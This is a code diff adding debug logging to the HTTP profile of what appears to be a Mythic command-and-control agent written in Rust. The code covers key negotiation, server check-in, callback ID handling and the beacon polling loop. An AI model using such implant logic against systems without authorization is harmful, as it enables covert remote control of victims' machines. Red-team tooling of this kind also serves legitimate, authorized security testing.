@@ -357,26 +357,39 @@ impl Profile for HttpProfile {
     }
 
     async fn start(&self) {
+        utils::print_debug("HTTP: start() entered");
         self.running.store(true, Ordering::Relaxed);
         self.should_stop.store(false, Ordering::Relaxed);
 
+        utils::print_debug(&format!("HTTP: Callback URL: {}", self.get_base_url()));
+
         // Negotiate key if needed
+        utils::print_debug("HTTP: Starting key negotiation");
         if !self.negotiate_key().await {
+            utils::print_debug("HTTP: Key negotiation FAILED, exiting");
             self.running.store(false, Ordering::Relaxed);
             return;
         }
+        utils::print_debug("HTTP: Key negotiation completed successfully");
 
         // Checkin
+        utils::print_debug("HTTP: Starting checkin");
         let checkin_response = match self.checkin().await {
-            Some(r) => r,
+            Some(r) => {
+                utils::print_debug("HTTP: Checkin received response");
+                r
+            }
             None => {
+                utils::print_debug("HTTP: Checkin FAILED, exiting");
                 self.running.store(false, Ordering::Relaxed);
                 return;
             }
         };
 
         if let Some(status) = &checkin_response.status {
+            utils::print_debug(&format!("HTTP: Checkin status: {}", status));
             if status != "success" {
+                utils::print_debug("HTTP: Checkin status not success, exiting");
                 self.running.store(false, Ordering::Relaxed);
                 return;
             }
@@ -384,6 +397,7 @@ impl Profile for HttpProfile {
 
         // Update Mythic ID and sync encryption keys
         if let Some(id) = &checkin_response.id {
+            utils::print_debug(&format!("HTTP: Received callback ID: {}", id));
             profiles::set_mythic_id(id);
             // Update profile UUID to use Mythic callback ID for all subsequent messages
             {
@@ -397,7 +411,11 @@ impl Profile for HttpProfile {
             if let Some(key) = key_b64 {
                 profiles::set_all_encryption_keys(&key);
             }
+        } else {
+            utils::print_debug("HTTP: WARNING - No callback ID in checkin response");
         }
+
+        utils::print_debug("HTTP: Entering main polling loop");
 
         // Main polling loop
         while !self.should_stop.load(Ordering::Relaxed) && !self.past_killdate() {
